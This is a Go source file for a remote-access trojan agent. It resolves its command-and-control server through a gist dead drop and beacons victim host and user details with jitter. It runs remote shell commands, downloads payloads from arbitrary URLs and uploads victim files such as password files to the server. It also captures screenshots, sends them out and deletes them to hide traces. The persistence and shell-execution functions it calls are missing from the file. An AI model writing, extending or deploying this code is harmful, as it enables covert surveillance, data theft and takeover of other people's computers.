package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

// Configuration
var (
	RESOLVER_URL = "https://gist.githubusercontent.com/..."
	C2URL        = ""
)

const (
	SleepTime   = 5 * time.Second
	JitterRange = 3
)

type Agent struct {
	ID       string `json:"id"`
	IP       string `json:"ip"`
	Hostname string `json:"hostname"`
	Platform string `json:"platform"`
	Username string `json:"username"`
}

type CommandResponse struct {
	ID     string `json:"id"`
	Output string `json:"output"`
}

type ServerResponse struct {
	Task string `json:"task"`
}

var agentID string

func main() {
	rand.Seed(time.Now().UnixNano())

	resolveC2Address()
	installPersistence()
	agentID = generateAgentID()
	agentInfo := collectSystemInfo()

	for {
		if C2URL == "" || C2URL == "Error" {
			resolveC2Address()
			time.Sleep(10 * time.Second)
			continue
		}

		task := beacon(agentInfo)
		if task != "" {
			output := processTask(task)
			sendResult(output)
		}

		sleepDuration := SleepTime + time.Duration(rand.Intn(JitterRange))*time.Second
		time.Sleep(sleepDuration)
	}
}

func resolveC2Address() {
	resp, err := http.Get(RESOLVER_URL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}

	resolvedIP := strings.TrimSpace(string(body))
	if strings.HasPrefix(resolvedIP, "http") {
		C2URL = resolvedIP
	}
}

func beacon(info Agent) string {
	jsonData, err := json.Marshal(info)
	if err != nil {
		return ""
	}

	resp, err := http.Post(C2URL+"/heartbeat", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	var serverResp ServerResponse
	if err := json.NewDecoder(resp.Body).Decode(&serverResp); err != nil {
		return ""
	}
	return serverResp.Task
}

func sendResult(output string) {
	data := CommandResponse{ID: agentID, Output: output}
	jsonData, _ := json.Marshal(data)
	http.Post(C2URL+"/result", "application/json", bytes.NewBuffer(jsonData))
}

func processTask(cmd string) string {
	cmd = strings.TrimSpace(cmd)
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return ""
	}

	// --- DOWNLOAD (Infiltration: URL -> Victim) ---
	// Usage: download http://hacker.com/virus.exe C:\Temp\virus.exe
	if parts[0] == "download" {
		if len(parts) < 3 {
			return "Usage: download <url> <path>"
		}
		return downloadFile(parts[1], parts[2])
	}

	// --- UPLOAD (Exfiltration: Victim -> C2) ---
	// Usage: upload C:\Users\Admin\Desktop\passwords.txt
	if parts[0] == "upload" {
		if len(parts) < 2 {
			return "Usage: upload <local_path>"
		}
		return uploadFileToC2(parts[1])
	}

	if parts[0] == "sysinfo" {
		return getSystemDetails()
	}
	if parts[0] == "kill" {
		os.Exit(0)
		return "Dead"
	}
	if parts[0] == "cd" && len(parts) >= 2 {
		os.Chdir(parts[1])
		return "CD OK"
	}
	if parts[0] == "screenshot" {
		return takeScreenshot()
	}

	return executeShellCommand(cmd)
}

func getSystemDetails() string {
	h, _ := os.Hostname()
	u, _ := user.Current()
	return fmt.Sprintf("Hostname: %s | User: %s | OS: %s", h, u.Username, runtime.GOOS)
}

// takeScreenshot captures the primary display and uploads it to the C2 server
func takeScreenshot() string {
	// 1. Get the number of active displays
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "Error: No active display found."
	}

	// 2. Capture the bounds of the primary display (Display 0)
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return fmt.Sprintf("Error capturing screen: %s", err)
	}

	// 3. Create a unique temporary filename using a timestamp
	fileName := fmt.Sprintf("screen_%d.png", time.Now().Unix())
	file, err := os.Create(fileName)
	if err != nil {
		return fmt.Sprintf("Error creating temp file: %s", err)
	}
	// Note: We don't defer file.Close() here because we must close it explicitly before uploading

	// 4. Encode the image to PNG format and save to disk
	if err := png.Encode(file, img); err != nil {
		file.Close()
		return fmt.Sprintf("Error encoding PNG: %s", err)
	}

	// CRITICAL: Close the file handle to release the lock before uploading
	file.Close()

	// 5. Upload to C2 Server
	// This uses the existing 'uploadFileToC2' function in your agent
	uploadResult := uploadFileToC2(fileName)

	// 6. Cleanup: Delete the temporary file from the victim's disk to hide traces
	os.Remove(fileName)

	return fmt.Sprintf("Screenshot taken & uploaded! Result: %s", uploadResult)
}

func downloadFile(url, path string) string {
	out, err := os.Create(path)
	if err != nil {
		return "Error creating file"
	}
	defer out.Close()
	resp, err := http.Get(url)
	if err != nil {
		return "Error downloading"
	}
	defer resp.Body.Close()
	io.Copy(out, resp.Body)
	return "Downloaded"
}

// Uploads a local file to the C2 Server
func uploadFileToC2(path string) string {
	// 1. Open the local file
	file, err := os.Open(path)
	if err != nil {
		return fmt.Sprintf("Error opening file: %s", err)
	}
	defer file.Close()

	// 2. Create Buffer & Multipart Writer
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// 3. Create Form File field
	part, err := writer.CreateFormFile("file", filepath.Base(path))
	if err != nil {
		return fmt.Sprintf("Error creating form file: %s", err)
	}

	// 4. Copy file content to buffer
	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Sprintf("Error copying file content: %s", err)
	}
	writer.Close() // Close writer to finalize boundary

	// 5. Send HTTP POST Request
	req, err := http.NewRequest("POST", C2URL+"/upload", body)
	if err != nil {
		return fmt.Sprintf("Error creating request: %s", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Sprintf("Error uploading: %s", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		return "File uploaded successfully to C2!"
	}
	return fmt.Sprintf("Upload failed. Status: %s", resp.Status)
}

func collectSystemInfo() Agent {
	h, _ := os.Hostname()
	u, _ := user.Current()
	return Agent{ID: agentID, IP: getOutboundIP(), Hostname: h, Platform: runtime.GOOS, Username: u.Username}
}

func generateAgentID() string {
	h, _ := os.Hostname()
	return fmt.Sprintf("%s-%d", h, rand.Intn(9999))
}

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
